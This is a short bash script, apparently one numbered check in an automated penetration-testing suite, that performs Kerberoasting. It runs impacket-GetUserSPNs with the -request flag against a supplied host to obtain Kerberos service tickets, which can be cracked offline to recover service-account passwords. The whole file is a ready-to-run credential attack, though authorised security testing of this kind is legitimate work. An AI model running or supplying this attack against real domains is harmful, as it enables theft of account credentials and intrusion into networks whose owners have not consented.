#!/bin/bash
# V-094 -- Kerberoasting
# Tool: impacket_GetUserSPNs
# Usage: bash V-094.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-094.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"
HOST=$(echo "$TARGET" | sed -E 's|https?://||' | sed 's|/.*$||' | sed 's|:.*$||')

echo "Kerberoasting"; impacket-GetUserSPNs "$HOST" -request 2>&1 | head -30
exit $?
